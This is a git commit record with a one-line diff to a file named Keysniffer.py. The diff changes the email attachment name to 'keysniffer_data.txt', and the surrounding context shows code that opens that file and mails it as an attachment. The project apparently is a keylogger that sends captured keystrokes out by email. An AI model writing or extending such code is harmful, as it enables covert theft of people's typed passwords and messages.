c252bf914d288bc72926c788617283335e577880
Cyb3rTyr <marquessarodrigo@gmail.com>
2024-12-31 15:47:32 +0100

    V3.3

--- Keysniffer.py
+++ Keysniffer.py
@@ -59,7 +59,7 @@ body = "Body_of_the_mail"
 msg.attach(MIMEText(body, "plain"))
 
 # open the file to be sent
-filename = "File_name_with_extension"
+filename = "keysniffer_data.txt"
 attachment = open("keysniffer_data.txt", "rb")
 
 # instance of MIMEBase and named as p
